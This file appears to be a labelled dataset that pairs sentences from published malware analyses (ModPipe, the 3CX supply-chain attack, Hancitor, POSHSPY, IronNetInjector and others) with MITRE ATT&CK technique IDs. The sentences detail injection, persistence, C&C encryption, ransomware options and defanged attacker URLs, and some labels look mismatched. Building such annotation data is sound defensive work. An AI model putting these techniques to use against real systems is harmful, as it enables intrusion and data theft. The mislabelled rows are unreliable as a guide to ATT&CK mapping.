"AdGuard Reset User Passwords After Enduring Credential Stuffing Attacks (September 24, 2018) Ad-blocking software company AdGuard reported that they had recently suffered a cyber-attack in the form of credential stuffing, and issued a password reset to all users for all accounts.",T1110
"They noticed repeated login attempts from suspicious IP addresses belonging to a variety of servers world-wide, using login credentials from what the company suspects are past data breaches from other companies.",T1110
Associate Professor Zhiyun Qian and doctoral student Weiteng Chen from the University of California discovered a vulnerability in unencrypted Wi-Fi routers that makes them susceptible to a TCP exploit.,T1210
"A threat actor could take advantage of this vulnerability by creating a specific file that contains data that is stored in the JET database format, and having the targeted user open it, which would then allow for remote code execution at the level of the current process.",T1210
"This vulnerability, registered as “CVE-2018-14327,” allows a low-privileged user account to escalate privileges on any Windows machine that had connected to the EE Mini modem via USB.",T1068
"For an attacker to exploit this vulnerability, they just have to replace the “ServiceManager.exe” file from the driver folder with a malicious file to trick the driver into running the tainted file and executing with higher SYSTEM privileges following a reboot.",T1036.005
A threat actor could establish an administrator session using the “network_mgr.cgi CGI” module in the HTTP and set the IP address as an admin session that will allow the actor to bypass future authentication when logging into the device over the internet.,T1078
This PHP file contains a payload download code that grabs malware to download and install the backdoor.,T1105
The PHP file “wp-content/themes/buildup/db.php” decrypts that specific payload code to the install the FilesMan backdoor that allows the threat actor to gain access to a website through their own machine.,T1140
The email is directed to “Non-Resident Alien” tax payers to have them fill out a PDF file (that is attached to the email) that certifies one is a non-resident or foreign corporation.,T1566.001
"Changing the passwords could then allow a threat actor access to that account with their own passcode, and then sign on as a legitimate user to view camera feeds or CCTV footage and recordings as well as delete a camera from a system completely.",T1078
"title: Hungry for data, ModPipe backdoor hits POS software used in hospitality sector url: https://www.welivesecurity.com/2020/11/12/hungry-data-modpipe-backdoor-hits-pos-software-hospitality-sector/ Backdoor authors show deep knowledge of the targeted POS software, decrypting database passwords from Windows registry values ESET researchers have discovered ModPipe, a modular backdoor that gives its operators access to sensitive information stored in devices running ORACLE MICROS Restaurant Enterprise Series (RES) 3700 POS – a management software suite used by hundreds of thousands of bars, restaurants, hotels and other hospitality establishments worldwide.",T1140
One of them – named GetMicInfo – contains an algorithm designed to gather database passwords by decrypting them from Windows registry values.,"T1005, T1140"
"This shows that the backdoor’s authors have deep knowledge of the targeted software and opted for this sophisticated method instead of collecting the data via a simpler yet “louder” approach, such as keylogging.",T1078
"Exfiltrated credentials allow ModPipe’s operators access to database contents, including various definitions and configuration, status tables and information about POS transactions.",T1078
One possible explanation is that another downloadable module exists that allows the malware operators to decrypt the more sensitive data in the user’s database.,T1140
"According to the documentation, to achieve this the attackers would have to reverse engineer the generation process of the “site-specific passphrase”, which is used to derive the encryption key for sensitive data.",T1027
"persistent loader – unpacks and loads the next stage of the malware, namely the main module.",T1027
"It creates a pipe used for communication with other malicious modules, un/installs these modules and serves as a dispatcher that handles communication between the modules and attacker’s C&C server.",T1041
"networking module – module used for communication with C&C. downloadable modules – components adding specific functionality to the backdoor, such as the ability to steal database passwords and configuration information, scan specific IP addresses or acquire a list of the running processes and their loaded modules.","T1057, T1005, T1016"
This information is encrypted and stored in DataS5 (for dba) and DataS6 (for micros) registry values within one of the following registry keys: HKLM\Software\Micros\UserData or HKLM\Software\WOW6432Node\Micros\UserData if run in Windows 32-bit on Windows 64-bit (WOW64) subsystem Figure 2.,"T1027, T1112"
"Hex-Rays decompiled code of the function stealing database passwords The GetMicInfo module can intercept and decrypt these database passwords, using a specifically designed algorithm.","T1140, T1078"
"Since the decryption mechanism wasn’t publicly available, there are at least three possible scenarios of how the attackers could have created the algorithm: The most probable option is that the attackers acquired and reverse engineered the implementation of the ORACLE MICROS RES 3700 POS and the libraries responsible for encryption and decryption of the database passwords.","T1027, T1140"
The attackers could have gained the information describing the implementation of the encryption and decryption mechanism from a 2016 data breach described in a blogpost by Brian Krebs.,"T1027, T1140"
"Our analysis shows that in cases where the GetMicInfo module decrypts the password for the dba username, it will also try to acquire the path to the SQL Anywhere API library from the environment variable “SQLANY_API_DLL” and load it if it’s available.","T1140, T1078"
"If one of these approaches is successful, GetMicInfo attempts to connect to the database using the following connection string: DBN=micros;UID=dba;ENG=sql%PCNAME%;PWD=%decrypted_DataS5% %PCNAME% represents the computer name retrieved via the GetComputerName API and %decrypted_DataS5% stands for the decrypted dba user password.","T1106, T1140, T1078"
Other information stolen by the module includes the version of the MICROS POS and information about specific registry keys most likely related to various credit card services configurations.,T1012
Hex-Rays decompiled code of the function that steals database data The GetMicInfo module is injected into one of the processes specified by the C&C in the install command (0x0C).,T1055
"Based on our findings, it is typically associated with one of the following legitimate processes: MDSHTTPService.exe (MICROS MDS HTTP Service) CALSrv.exe (MICROS CAL Service – Client Application Loader server) explorer.exe We can confirm that the GetMicInfo module can successfully obtain the database passwords from RES 3700 POS v4.7 and v5.4.",T1078
The main purpose of ModScan 2.20 is to collect additional information about the installed MICROS POS environment on the machines by scanning selected IP addresses.,T1016
The ModScan 2.20 module is injected into one of the processes specified by the C&C via an InstallMod command (0x72).,T1055
"Based on our findings, it is typically associated with one of the following legitimate processes: MDSHTTPService.exe (MICROS MDS HTTP Service) CALSrv.exe (MICROS CAL Service – Client Application Loader server) msdtc.exe jusched.exe spoolsv.exe services.exe Differences between the injected processes misused by GetMicInfo and those targeted by ModScan 2.20 might be caused by the fact that GetMicInfo module is injected only into processes running under WOW64.",T1055
The list of IP addresses intended for scanning and the special “ping” IP address are specified by the C&C in one of two ways.,T1016
"It is either: downloaded from the C&C along with the ModScan module, or received during runtime, using the named pipe associated with the ModScan module.",T1105
"ModScan 2.20 module pipe commands Command nameCommand description exitExit stopTerminate scanning threads scanStart scanning IPs specified in the command data to collect additional information about the environment prmSpecify special “ping” IP address Scanning procedure routine Before scanning, the module sends a special “ping” message containing a 32-bit value generated by the GetTickCount Windows API function to TCP ports 50123 (used by MDS HTTP Service) and 2638 (used by SAP Sybase database server) of the “ping” IP address.","T1095, T1106, T1016"
The response from the “ping” IP address should contain the same 32-bit value rotated right by one bit and XORed with the value 0x6CF6B8A8.,T1027
"If the response on at least one of the ports provides the appropriate value, the module will start the scan of the selected IP addresses.",T1016
"Hex-Rays decompiled code of the ModScan ping functionality When the ModScan module starts the scan, some of the following information may be gathered, depending on the parameters received along with the scan command: Version of the Oracle MICROS RES 3700 POS, which is acquired by sending an HTTP Post message (see Figure 5) to the specified IP address on port 50123 used by the MDS HTTP Service.","T1071.001, T1082"
The sought-after information is stored between data xml tags (<data>%version%</data>) of the response from the service. 1234567891011121314151617181920 POST /%s,T1027
"MDS HTTP Service request Name of the database, extracted by sending a specially crafted TCP packet (possibly using the CMDSEQ command protocol) to the selected IP address on port 2638 used by the SAP Sybase Database Server.",T1095
"To gain this information, the ModScan module sends a hardcoded TDS 4.2 & 5.0 Login Packet (Figure 6) to the specified IP address on port 2638.",T1095
"The response includes a Login Acknowledgement packet which, in both cases – success and failure – contains information about the database server and the TDS versions used.",T1082
"The TDS login packet is hardcoded, with username set to the built-in dba and a hardcoded password, which is potentially the default password in some RES 3700 POS versions.",T1078
"Its main purpose is to collect information about currently running processes, including: name, process identifier (PID), parent process PID, number of threads, token owner, token domain, process creation time, and command line.",T1057
"Optionally, ProcList can also collect information about loaded modules for each of the running processes.",T1057
"This causes the hash of the dropped loader to change with each execution, complicating detection and tracking of the malware.",T1027
"The dropper component can drop the loader into two possible locations and set up the persistence mechanism by creating a Windows service or Windows registry Run key (for details, please refer to the Indicators of Compromise section).","T1543.003, T1112"
"The encrypted payload, containing the main functionality of the dropper, is stored in the dropper’s resources as bitmaps named from A to L.",T1027
"The dropper decrypts this payload using the provided command line parameter, then executes it.",T1140
"The payload is responsible for decrypting the appropriate loader depending on the system architecture, so either 32-bit or 64-bit.",T1140
"Each of the loaders is encrypted using its own XOR key, each 0x80 bytes long.",T1027
"Decompiled code responsible for loading the payload from the binary’s resources, its decryption and execution is shown in Figure 7.","T1027, T1140"
"Persistent loader This component is responsible for both unpacking the main module and for its injection into one of the following processes: lsass.exe wininit.exe services.exe To unpack the main module, the persistent loader uses different approaches for the 32-bit and 64-bit versions.","T1027, T1055"
While the 32-bit loader is almost identical to the initial dropper – the only difference being the payloads stored in the resources – the 64-bit loader uses completely different “unpacking” code.,T1027
It then periodically checks the pipe for new messages using the PeekNamedPipe Windows API function.,T1106
"List of pipe message/command types Message codeDescription 0x10000012inject and execute received module in specified process 0x10000013data for C&C server (execution logs, stolen data, …)","T1041, T1055"
"0x10000023set C&C communication time intervals 0x10000024close received list of handles 0x10000025get handle of the process with specified PID, duplicate it for some other specified process and send it through the received named pipe handle 0x10000072C&C commands (encrypted) – see Table 4 for the full list of available commands For the detailed structure and format used for the messages transferred through the pipe refer to Figure 10. Figure 10.",T1057
"Structure of the main module’s named pipe messages For communication with its C&C server, the main module uses HTTP and port 80.",T1071.001
Messages sent to the C&C (see Figure 11) are constructed and encrypted within the main module’s code.,T1027
"The URLs use the following format www.%domain%[.]com/?%rand%, where %domain% is randomly chosen from google, bing and yahoo and %rand% is a random 32-bit unsigned integer represented in ASCII.",T1573.001
Communication with the C&C is encrypted using AES in CBC mode with the following 128-bit key:,T1573.001
"Before encryption, C&C messages start with a 4-byte checksum, which is calculated as CRC32 (message) XORed with the first 4 bytes of the AES key used to encrypt the message.",T1573.001
"In the case of the key mentioned above, this would be F4 5D 07 6F. The data is transmitted using the lightweight networking module, which is injected on demand and exits immediately after uploading or downloading the requested message.",T1095
"To select the process for injection, the main module enumerates running processes and assigns them a priority value between 3 and 6.",T1057
"Those with higher priority are injected first, based on the following criteria: Priority 6 The highest priority, assigned to any process that has already been used successfully to inject a networking module, received a response from the C&C and that is still running under the same PID, name and CreationTime.",T1055
"Priority 5 Process name with no extension that matches one of the following process names used for browsers: iexplore, opera, chrome, firefox Priority 4 Process name with no extension that matches the following process names: explorer, svchost Priority 3 All the other running processes excluding the following system processes: system, lsass, csrss, lsm, winlogon, smss, wininit The main reason behind the priority list is to inject processes that are expected to communicate over the network and at the same time avoid system processes that might attract attention if caught communicating over the network.","T1055, T1071.001"
Networking module This ModPipe module is responsible for sending requests to C&C and parsing payload received in the C&C responses.,T1105
HTTP POST or GET methods with headers shown in Figure 12 and Figure 13 can be used to upload data to C&C and download additional payloads and C&C commands.,"T1041, T1105, T1071.001"
"Example C&C server response including encrypted payload If all conditions are met, the network module sends the C&C response to the main module using a pipe message with ID 0x10000072.",T1027
"The main module then decrypts the payload, verifies its checksum and executes the C&C command.",T1140
"List of available main module commands Command codeCommand description 0x01Exit 0x05Update list of C&C addresses 0x0AInject and execute received module in specified process 0x0BInject and execute received module in specified process (module name is included in the command) 0x0COptionally write module to the encrypted storage, then inject and execute received module in specified process – add it to the list of the installed modules 0x0DSend command to the named pipe belonging to the module with specified ID and queue the response for the upload to the C&C 0x0EUninstall module with specified ID (remove from the in-memory list and encrypted storage)","T1027, T1055"
"Probably the most intriguing finding is the algorithm hidden in one of the backdoor’s modules, which was specifically designed to steal credentials by decrypting them from registry values.","T1005, T1140, T1078"
Windows Command ShellAttackers were seen using Windows Command Shell to execute the initial dropper. PersistenceT1547.001Boot or Logon Autostart Execution: Registry Run Keys / Startup FolderModPipe can use Registry Run key for persistence.,"T1547.001, T1059.003"
Windows ServiceModPipe can create a new service for persistence.,T1543.003
Defense EvasionT1055.002Process Injection: Portable Executable InjectionModPipe can inject it’s modules into various processes.,T1055
Credential AccessT1552.002Unsecured Credentials: Credentials in RegistryModPipe’s GetMicInfo module retrieves encrypted database passwords for ORACLE MICROS RES 3700 POS software from Windows Registry and uses a custom algorithm to decrypt them before uploading to the C&C. DiscoveryT1057Process DiscoveryModPipe’s ProcList module can get information about processes running on a system.,T1057
"T1012Query RegistryModPipe’s GetMicInfo module queries the Registry for ORACLE MICROS RES 3700 POS version, database passwords and other configuration data.",T1012
T1033System Owner/User DiscoveryModPipe gathers username and computer name from victim machines and reports them to the C&C in initial message.,T1033
Command and ControlT1071.001Application Layer Protocol: Web ProtocolsModPipe uses HTTP for command and control.,T1071.001
Symmetric CryptographyModPipe encrypts communication with C&C using AES in CBC mode.,T1573.001
Over C2 ChannelModPipe exfiltrates data over its C&C channel. T1029Scheduled TransferDefault interval used by ModPipe for uploading data to C&C is set to 30 minutes.,T1041
"Additionally, Sophos MDR has observed the campaign leveraging a public file storage to host encoded malware.",T1027
"This repository has been in use since December 8, 2022; after news of the compromise spread widely on March 29, the repository was taken down.",T1574.002
"The attack revolves around a DLL sideloading scenario, one with a remarkable number of components involved.",T1574.002
"We have identified three crucial components: 3CXDesktopApp.exe, the clean loader d3dcompiler_47.dll, a DLL with an appended encrypted payload ffmpeg.dll, a Trojanized loader Figure 2 presents a high-level look at the attack flow as it works in Windows; there are some minor variations in the later steps with the MacOS version.",T1027
"Figure 2: A high-level view of the attack flow The file ffmpeg.dll contains an embedded URL which retrieved a malicious encoded .ico payload from GitHub file storage at https[:]//raw.githubusercontent.com/IconStorages/images/main/ — though, again, once news of the compromise spread widely, this repository was taken down.",T1027
"We saw several variations on the ffmpeg.dll file, including one that was signed by 3CX’s own certificate; these appear to be maliciously patched versions of the legitimate ffmpeg.dll.",T1036.005
"Figure 3: When ffmpeg stepped onto Twitter to defend its code In a normal DLL sideloading scenario, the malicious loader (ffmpeg.dll) would replace the clean dependency; its only function would be to queue up the payload.",T1574.002
"We conclude from this that this compromise does not affect other Electron apps — only the 3CX ffmpeg.dll. Figure 4: What the affected 3CX developers and customers experienced Allowing the abused software to remain functional is not dissimilar to other DLL sideloading cases we’ve seen, but this campaign is slightly different even from the current rash of DLL sideloading cases we’ve seen.",T1574.002
"Figure 5: A timestamp mechanism in the code Looking at this, we can see a while loop that calls the check_timestamp function and receives a 64-bit integer value from GetSystemTimeAsFileTime Api call.",T1106
"Only once the results of check_timestamp are greater than the manifest timestamp will the code proceed and generate the HTTP request to connect with GitHub, which initiates the payload download.","T1105, T1071.001"
"Once a host is found, GoBruteforcer tries to get access to the server via brute force.",T1110
Scanning and System Access The GoBruteforcer malware samples are packed with UPX Packer.,T1027
"Upon unpacking a sample (SHA256 ebe11121aafdac5d8f2eecba710ba85efa31617a5eb825ba2e89e23379b26b84), we observed that GoBruteforcer has a multiscan module (shown in Figure 3) it uses to scan for the hosts inside a CIDR for its attack.",T1027
"Portscan function (present inside every scanning module).For the phpMyAdmin Service When scanning for phpMyAdmin services, if the target port (port 80) is open, the GoBruteforcer malware tries to login and get access to the victim server via brute force.",T1110
"To do this, the malware uses a set of credentials that is hard coded into the malware binary, as shown in Figure 6. Figure 6.",T1110
Hard-coded credentials for brute forcing.,T1110
"IRC Bot Deployment Upon successful login via phpMyAdmin service into the victim server, GoBruteforcer deploys and executes an IRC bot on the victim server.",T1110
"If you’re not familiar with this instruction set, here’s two of my favorite resources to get you up to speed: Opening the malware in a disassembler, (starting at its main) we spot some (fairly common) anti-debugging logic: main ... 000000010000b108 bl imp___stubs__getppid 000000010000b10c mov x1, x0 000000010000b110 mov w0, #0x1f 000000010000b114 mov x2, #0x0 000000010000b118 mov w3, #0x0 000000010000b11c bl imp___stubs__ptrace 000000010000b120 cmn w0, #0x1 In short, this snippet of code invokes ptrace with PT_DENY_ATTACH (0x1f) which will kill the process if a debugger is currently attached, and also prevent future attachments.",T1055
"Next, we find an XOR loop that decrypts this configuration.","T1027, T1140"
"The malware then initializes various global variables, either with hard-coded values, or from the decrypted configuration (now held in g_Config).",T1140
"For example, setting bdaemon to false will prevent the binary from daemonizing (making it easier to debug), while setting bfullog to true to coerce the malware to log its actions!",T1140
"The malware then de-XORs other strings, with the hard-coded key of 0x39 000000010000b260 ldr w8, =0x1964126200000039 Most of the strings are de-XOR’d in a function aptly named de_xor_all.",T1140
"We could step through this and dump each string manually, or, as a hard-coded XOR key is used, simply de-XOR the entire binary and see what falls out: with open(""locker_Apple_M1_64"", ""rb"") as f_in, open(""strings"", ""wb"") as f_out: while True: chunk = f_in.read(1024) if not chunk: break encrypted_chunk = bytes(byte ^","T1027, T1140"
f_out.write(encrypted_chunk),T1059.003
This produces strings including a commandline usage: Usage: %s,T1059.003
"-i, --indir path to crypt -m, --minfile minimal size of a crypted file, no less than 4096 -r, --remove self remove this file after work -l, --log prints the log to the console -n, --nolog do not print the log to the file /tmp/locker.log -d, --daemonize runs a program as Unix daemon -w, --wholefile encrypts whole file -b, --beginfile encrypts first N bytes -e, --extentions encrypts files by extentions -o, --nostop prevent to stop working VM -t, --wipe wipe free space -s, --spot upper bound limitation value of spot in Mb -p, --pass password -f, --full full log -a, --delay start delay in minutes -y, --noexts do not search for extentions -v, --vmdk search for extentions inside VMDK files Clearly these match to the global variables that apparently can be set via the command-line as well.","T1059.003, T1070.004"
As we’ll set this makes analysis even easier!,T1140
"Also the de-XOR’d strings, we find the full ransom note (here, truncated):",T1140
"If you don't pay the ransom, the data will be published on our TOR darknet sites.",T1090
"If you do not pay the ransom, we will attack your company again in the future.",T1140
"Once the malware has de-XOR’d all its strings, it invokes a method named go.",T1140
"This parses command-line options (updating global variables is relevant), and performs various other initializations, such as invoking a function named sodium_init (likely to initialize the commonly used Sodium crypto library).",T1059.003
"We found that one of the submitters also uploaded two other samples, which are most likely embedded payloads of one of the IronPython scripts.",T1027
"While the IronPython scripts are only the first part of the tool, the main task of loading malware is done by an embedded process injector.",T1027
And further: IronPython’s sweet-spot is being able to use the .NET framework APIs directly from Python.,T1106
"With IronPython, you can use .NET framework APIs directly in your Python script.",T1106
You can make use of the .NET framework APIs without having to compile a .NET assembly.,T1106
"Also, IronPython scripts don’t run with the original Python interpreter when .NET framework APIs are used in the code.",T1106
IronNetInjector IronNetInjector is made of an IronPython script that contains a .NET injector and one or more payloads.,T1027
"When an IronPython script is run, the .NET injector gets loaded, which in turn injects the payload(s) into its own or a remote process.",T1055
The key features of the malicious IronPython scripts are as follows: Function and variable names are obfuscated.,T1027
Strings are encrypted.,T1027
Contain an encrypted .NET injector and one or more encrypted PE payloads.,T1027
Take one argument that is the decryption key for the embedded .NET injector and PE payload(s).,T1027
Embedded .NET injector and payload(s) are encoded with Base64 and encrypted with Rijndael.,T1027
"Decoded IronPython script with embedded .NET injector and ComRAT payload (both shortened).We have found two versions of the .NET injector, a newer variant internally named NetInjector compiled in 2019 and an earlier variant named PeInjector_x64 compiled in 2018.","T1027, T1140"
Both versions are full-blown PE injection tools able to load a native x86/64 payload reflectively into a remote process.,T1055
Most of its code is taken from PowerShell Empire’s ReflectivePEInjection script and got translated into C#.,T1055
The newer version additionally contains the ability to inject .NET assemblies into unmanaged processes.,T1055
"Based on the file sizes and the file sizes of the embedded payloads in the IronPython scripts, we can make some assumptions about what the payloads likely are.",T1027
It also shows which other samples uploaded by the same submitter or the other submitters are connected and gives the assumed embedded malware: Submitter IronPython script(s) uploads Related samples uploaded by same submitter Payload assumptions 1 • prophile.py • profilec.py • IronPython-2.7.7z: Portable IronPython version that contains the two IronPython scripts and a Windows task XML to start profilec.py • prophile.py: .NET injector (variant 2018),"T1027, T1053.005"
Windows task XML file for IronNetInjector.,T1053.005
The task is used to start an IronPython script with the 64-bit version of the interpreter.,T1053.005
"As a command line argument, the Rijndael decryption key is passed.","T1059.003, T1140"
"However, the key didn’t decrypt on any of the embedded files in the scripts we found.",T1027
The task’s description is PythonUpdateSrvc and it runs either on Windows startup when a user logs in or when one of two system events get created: Figure 3.,T1053.005
The IronPython scripts and the Windows task XML were placed in the same directory.,T1053.005
The task file is then used to create a task which in turn starts a script when triggered.,T1053.005
"However, it’s also possible that the submitter collected the files from different places and just bundled them into an archive for scanning purposes.",T1005
"In the IronPython script, the embedded .NET injector (SHA256: a56f69726a237455bac4c9ac7a20398ba1f50d2895e5b0a8ac7f1cdb288c32cc) and ComRAT DLL payload (SHA256: a62e1a866bc248398b6abe48fdb44f482f91d19ccd52d9447cda9bc074617d56) get decoded and decrypted.","T1027, T1140"
The decryption key is passed as an argument to the IronPython script.,T1140
"After the injector assembly is loaded, the ID of the process where the ComRAT DLL gets injected is retrieved.",T1055
The output is then parsed to the targeted process ID with the help of tasklist filters.,T1057
Contains 32-/64-bit bootstrappers to load an assembly into an unmanaged process.,T1055
Contains the imported unmanaged function declarations and win32 structures/constants.,T1106
The method InjectAssembly is used to inject a .NET assembly into a native process (or its own) and InvokeAssemblyMethod to call any chosen method of the injected assembly.,T1055
The method Invoke is used to inject a native PE into a remote process and InvokeVoid to call any exported function of the injected payload.,T1055
"Depending on the number of arguments passed to DefaultSerializer on creation time, the payload is either loaded into its own process or a remote one.",T1055
The other options are to also pass the ID or handle of the remote process the payload gets injected to.,T1055
"In our case, the second option is used with the PID of explorer.exe to load the ComRAT payload reflectively into the process.",T1055
One other interesting aspect of the injector is its ability to load an assembly into an unmanaged process.,T1055
"This is accomplished with a native bootstrapper DLL, which gets injected into the remote process and prepares it so a .NET assembly can be injected afterwards.",T1055
These scripts contain an embedded PE loader to execute an embedded malware payload.,T1027
Only the initial IronPython scripts are obfuscated to prevent easy detection.,T1027
POSHSPY leverages two of the tools the group frequently uses: PowerShell and Windows Management Instrumentation (WMI).,T1047
POSHSPY's use of WMI to both store and persist the backdoor code makes it nearly invisible to anyone not familiar with the intricacies of WMI.,T1047
"Later in that same engagement, the attacker updated the deployment of the backdoor to use WMI for storage and persistence.",T1047
"WMI provides many administrative capabilities on local and remote systems, including querying system information, starting and stopping processes, and setting conditional triggers.",T1047
"WMI can be accessed using a variety of tools, including the Windows WMI Command-line (wmic.exe), or through APIs accessible to programming and scripting languages such as PowerShell.",T1047
Users with sufficient system-level privileges can define custom classes or extend the functionality of the many default classes.,T1047
WMI permanent event subscriptions can be used to trigger actions when specified conditions are met.,T1047
"Subscriptions consist of three core WMI classes: a Filter, a Consumer, and a FilterToConsumerBinding.",T1047
"WMI Consumers specify an action to be performed, including executing a command, running a script, adding an entry to a log, or sending an email.",T1047
"WMI Filters define conditions that will trigger a Consumer, including system startup, the execution of a program, the passing of a specified time and many others.",T1047
Creating a WMI permanent event subscription requires administrative privileges on a system.,T1047
We have observed APT29 use WMI to persist a backdoor and also store the PowerShell backdoor code.,T1047
"To store the code, APT29 created a new WMI class and added a text property to it in order to store a string value.",T1047
APT29 wrote the encrypted and base64-encoded PowerShell backdoor code into that property.,T1027
APT29 then created a WMI event subscription in order to execute the backdoor.,T1047
"The subscription was configured to run a PowerShell command that read, decrypted, and executed the backdoor code directly from the new WMI property.",T1140
POSHSPY WMI Component The WMI component of the POSHSPY backdoor leverages a Filter to execute the PowerShell component of the backdoor on a regular basis.,T1047
Figure 1: “BfeOnServiceStartTypeChange” WMI Query Language (WQL) filter condition,T1047
The BfeOnServiceStartTypeChange Filter was bound to the CommandLineEventConsumer WindowsParentalControlsMigration.,T1047
The WindowsParentalControlsMigration consumer was configured to silently execute a base64-encoded PowerShell command.,T1027
CommandLineTemplate Figure 3 contains the decoded PowerShell command from the “CommandLineTemplate.” Figure 3: Decoded CommandLineTemplate PowerShell code POSHSPY PowerShell Component The full code for a POSHSPY sample is available here.,T1140
The POSHSPY backdoor is designed to download and execute additional PowerShell code and Windows binaries.,T1105
Downloading and executing PowerShell code as an EncodedCommand 2.,"T1027, T1105"
"Writing executables to a randomly-selected directory under Program Files, and naming the EXE to match the chosen directory name, or, if that fails, writing the executable to a system-generated temporary file name, using the EXE extension 3.",T1036.005
Encrypting communications using AES and RSA public key cryptography 5.,T1573.001
"Appending a file signature header to all encrypted data, prior to upload or download, by randomly selecting from the file types: ICO GIF JPG PNG MP3 BMP The sample in this example used 11 legitimate domains owned by an organization located near the victim.",T1027
"Infrequent beaconing, use of DGA and compromised infrastructure for C2, and appended file headers used to bypass content inspection made this backdoor difficult to identify using typical network monitoring techniques.",T1027
Enabling and monitoring enhanced PowerShell logging can capture malicious code as it executes and legitimate WMI persistence is so rare that malicious persistence quickly stands out when enumerating it across an environment.,T1047
This presentation by Christopher Glyer and Devon Kerr contains additional information on attacker use of WMI in past Mandiant investigations.,T1047
The FireEye FLARE team released a WMI repository-parsing tool that allows investigators to extract embedded data from the WMI repository and identify WMI persistence.,T1047
"title: Hancitor Infection Chain Analysis: An Examination of its Unpacking Routine and Execution Techniques url: https://threatresearch.ext.hp.com/hancitors-return-analyzing-its-latest-infection-chain/ In this article, we describe how Hancitor compromises systems based on its infection chain observed in January and February 2021.",T1027
"We cover its unpacking routine, information gathering and command and control (C2) functions, and payload execution techniques.",T1027
Its main purpose is to download and execute a second stage malware payload from one of multiple encrypted URLs contained in the malware itself.,"T1027, T1105"
"The first Hancitor malicious spam wave of 2021 started on 12 January, where the malware was distributed as email Word document attachments.",T1566.001
"When opened, the user sees a social engineering image telling them that they must click the “Enable editing” button to see the document’s contents.",T1204.002
Figure 1 – Word document lure requesting the user to run the VBA macro.,T1204.002
"As the VBA code does not know where the file was stored, it then recursively searches through all local temp folders.",T1083
Figure 3 – VBA macro which moves the tmp file to the templates folder as a DLL.,T1036.005
"Once the “.tmp” file is found, it is moved and renamed to the Office templates folder (C:\Users\username\AppData\Roaming\Microsoft\Templates) as “W0rd.dll” and loaded using rundll32.exe.","T1218.011, T1036.005"
"As a second argument, the macro passes the entry function “DllUnregisterServer” to rundll32.exe so that the execution starts correctly.",T1218.011
Figure 4 – VBA macro which runs rundll32.exe to load the malware.,"T1027, T1218.011"
"Packed DLL analysis Briefly looking at the DLL characteristics shows that there are two unknown sections, which could be an indicator of packing being used to obfuscate the malware.",T1027
"Opening the DLL in a debugger and running through the program, focusing on what is happening with the suspicious sections confirms that there is indeed some sort of unpacking happening.",T1027
Figure 5 – Sections of the PE file (“W0rd.dll”).,T1027
"Although the unpacking procedure happens in multiple steps, it can be described in two broad stages: Decryption Stage 1 First, the malware allocates new memory which is used to copy the data from section “.rdata4” into it.",T1027
"As soon as the copy operation is finished, the decryption process starts.",T1140
The first four bytes at the beginning of the newly allocated memory indicate the length of the data that will be decrypted.,T1140
The algorithm to decrypt the data is simple.,T1140
Figure 6 – Data view of the section containing the encrypted malware.,"T1027, T1140"
"Looking at the decrypted data and the behavior of the program, we can see that there are multiple areas containing different types of information.",T1140
The names of Windows API functions are stored in the first 150 bytes.,"T1027, T1106"
The area after this contains encrypted data.,T1027
"Finally, the executable code used to decrypt the encrypted data is located at the end of the section.",T1140
Figure 7 – Structure of the encrypted section.,"T1027, T1106"
The API function located at the beginning of the memory section are resolved using GetProcAddress.,T1106
"After resolving the functions, the second decryption stage occurs.","T1027, T1140"
", the decrypted memory structure contains executable code.","T1027, T1140"
"As expected, the instruction pointer jumps directly to this section, which also contains the decryption algorithm for the second stage.",T1140
"Before the decryption starts, new memory is allocated and the encrypted data from stage 1 is copied to it.","T1027, T1140"
"The decryption algorithm of stage 2 is generally the same, but uses 0x3E9 as the initialization key.",T1140
The output of this decryption leads us to a PE file.,T1140
This technique is called self-injection or PE overwrite.,T1055
"To make the new image runnable, several Windows API functions are resolved using GetProcAddress and directly patched into the memory of the loaded executable.","T1027, T1106"
"Running Hancitor Malware As soon as the unpacked executable is running, the malware gathers information about the infected system.",T1027
"This function obtains the username, the computer name and the domain of infected system.","T1033, T1082"
"The subsequent functions collect additional information such as the machine’s public IP address, domain trust information and the computer architecture.","T1016, T1082"
"The malware identifies the computer’s public IP address by making a HTTP GET request to “hxxp://api.ipify[.]org”, a free public IP address API.",T1071.001
All the collected information is then put together into a query string which is generated based on the computer architecture.,T1082
Figure 10 – Query string containing system information before being sent to the C2.,"T1041, T1573.001"
"To determine the command and control (C2) servers waiting for the data to be sent to, the malware calls a decryption function that uses the RC4 algorithm to get a list of potential C2 URLs.","T1573.001, T1140"
Figure 11 – URL and build decryption function.,"T1140, T1071.001"
"After successfully decrypting the C2 URLs, the data is sent there using a HTTP POST request adding the constructed query string as data.","T1140, T1071.001"
"To increase the probability of reaching an active server, the malware iterates over all the decrypted C2 URLs and tries to reach all of them until one of them sends a response.",T1140
We assume that based on the received data the C2 server responds with either a simple string which can be decrypted to an active malware download server or with garbage data in the form of a simple string.,T1140
"Although the decoding algorithm of the C2 response looks quite complex, it is actually Base64 decoding, followed by an XOR operation using the key 0x7A.",T1140
"If the decryption leads to a valid URL, the malware initiates a download, which delivers an executable.",T1105
"To execute the binary, Hancitor uses one of the following techniques: Create Process Create Thread Process Hollowing Thread Execution Hijacking Create Process If the method “Create Process” is chosen, then the malware writes the retrieved executable to disk into the temp folder and executes it using rundll32.exe with “start” as the argument for the entry function.","T1055, T1218.011"
"The malware simply allocates some memory, writes the malware into it and creates a new thread from it.",T1055
"Process Hollowing If the Process Hollowing method is used, a new svchost.exe process is created in a suspended state.",T1055
"The malware then allocates new memory in the newly-created process, writes the executable to it and executes it in a new thread.",T1055
Figure 13 – Process creation function.,T1055
Thread Execution Hijacking The final execution method Hancitor supports is Thread Execution Hijacking.,T1055
This method is mostly the same as the above described Process Injection method.,T1055
The only difference is that the malware replaces the thread context with the downloaded executable and resumes it afterwards.,T1055
The latter is launched with a command line URL executing the content.,T1059.003
Disassembly analysis of the program showed it was a small application that loaded the IE COM object and launched the function RunHTMLApplication() against the command line argument provided.,T1059.003
"Further analysis showed that the malware was based on a 2018 version of the binary (original hash: 5ced5d5b469724d9992f5e8117ecefb5) with only six bytes of data appended, as shown in Figure 4. Figure 4: CyberChef diff between MSHTA.exe and smartpss.exe Phase 3: Downloaded VBScript and PowerShell Upon execution, the modified Mshta file was executed with the URL, hxxp://sdoc[.]xyz/ID-508260156241, and passed as an argument on the command line.","T1105, T1059.003"
"Figure 5: PCAP from e9ed774517e129a170cdb856bd13e7e8 VirusTotal results not returning malicious content Shortly after the download, a PowerShell script block was executed to download SMOKEDHAM, as shown in Figure 6.",T1105
"Figure 6: SMOKEDHAM downloader Within seconds, a file named qnxfhfim.cmdline was written to disk and executed using the Command-Line Compiler.",T1059.003
